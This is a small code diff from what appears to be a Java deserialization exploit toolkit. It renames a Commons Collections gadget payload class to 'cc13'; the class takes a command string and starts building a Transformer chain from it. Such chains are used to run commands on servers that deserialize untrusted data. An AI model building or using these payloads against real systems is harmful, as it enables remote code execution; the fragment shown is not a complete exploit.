@@ -16,7 +16,7 @@ import java.util.Map;
 
 @Dependencies({"commons-collections:commons-collections:3.1"})
 @Authors({Authors.Unam4})
-public class CommonsCollections13 implements ObjectPayload<Object> {
+public class cc13 implements ObjectPayload<Object> {
     @Override
     public Object getObject(String command) throws Exception {
         final Transformer[] transformers     = TransformerUtil.makeTransformer(command);
